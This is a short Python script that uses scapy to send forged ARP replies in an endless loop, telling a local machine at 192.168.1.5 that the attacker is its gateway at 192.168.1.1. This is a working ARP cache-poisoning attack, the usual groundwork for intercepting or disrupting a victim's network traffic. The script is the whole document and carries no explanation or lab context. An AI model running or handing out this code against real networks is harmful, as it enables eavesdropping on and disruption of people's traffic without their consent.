from scapy.all import *

target_ip = "192.168.1.5" #target ip
gateway_ip = "192.168.1.1" #target gateway

def arp_spoof():

    packet = ARP(
        op=2,
        pdst=target_ip,
        psrc=gateway_ip
    )

    send(packet, verbose=False)

while True:
    arp_spoof()
